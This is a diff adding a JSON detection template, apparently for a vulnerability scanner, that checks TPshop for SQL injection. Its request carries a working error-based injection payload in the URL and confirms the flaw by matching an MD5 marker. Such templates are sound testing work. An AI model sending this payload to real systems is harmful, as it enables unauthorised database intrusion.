@@ -1,0 +1,32 @@
+{
+    "Name": "tpshop-sqli",
+    "Description": "tpshop-sqli",
+    "Product": "tpshop",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "GET",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+        "Uri":"/mobile/index/index2/id/1) and (select 1 from (select count(*),concat(0x716b627671,(select md5(12123)),0x716b627671,floor(rand(0)*2))x from information_schema.tables group by x)a)--",
+        "Port":"",
+        "Data":"",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+                {
+                "Operation": "contains", 
+                "Key":"",
+                "Value": "0acf03f408f90ea0dcba786d300620db"
+                },
+                 {
+                "Operation": "code", 
+                "Key":"",
+                "Value": "200"  
+                 }
+        ]
+        },
+        "Next_decide":""
+                }
+]}
